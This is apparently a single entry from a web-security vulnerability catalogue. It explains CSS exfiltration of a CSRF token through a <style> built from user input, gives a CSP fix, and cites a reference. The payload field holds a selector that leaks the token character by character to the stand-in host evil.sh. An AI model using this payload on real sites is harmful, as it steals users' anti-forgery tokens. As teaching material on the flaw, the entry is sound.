---
order: 6
cwe: 200
title: CSS exfiltration
category: injection
severity: medium
sink: |-
    <style> built from user input
payload: |-
    html:has(input[name=csrf][value^="a"]) {
      background: url(//evil.sh?c=a);
    }
fix: |
    Content-Security-Policy: style-src 'self'; img-src 'self'
refs:
    - https://portswigger.net/research/blind-css-exfiltration
---

No script needed. One selector per character, and your CSRF token walks out to me through background requests.
